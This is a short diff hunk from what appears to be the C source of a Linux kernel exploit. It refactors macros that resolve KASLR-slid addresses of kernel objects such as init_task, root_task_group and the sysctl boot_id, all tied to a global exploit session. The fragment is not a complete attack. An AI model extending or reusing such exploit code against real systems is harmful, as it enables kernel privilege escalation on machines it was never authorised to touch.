@@ -77,17 +77,17 @@
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
 #define SLIDE_NFULNL_LOGGER \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_NFULNL_LOGGER_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_NFULNL_LOGGER_IMAGE)
 #define SLIDE_LOGGERS_0_1 \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_LOGGERS_0_1_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_LOGGERS_0_1_IMAGE)
 #define SLIDE_RANDOM_BOOT_ID_DATA \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
 #define SLIDE_INIT_TASK \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_INIT_TASK_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_INIT_TASK_IMAGE)
 #define SLIDE_ROOT_TASK_GROUP \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_ROOT_TASK_GROUP_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_ROOT_TASK_GROUP_IMAGE)
 #define SLIDE_SYSCTL_BOOTID \
-  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_SYSCTL_BOOTID_IMAGE)
+  g_exploit_session.addresses.data_alias(SLIDE_SYSCTL_BOOTID_IMAGE)
 
 struct local_sched_attr {
     uint32_t size;
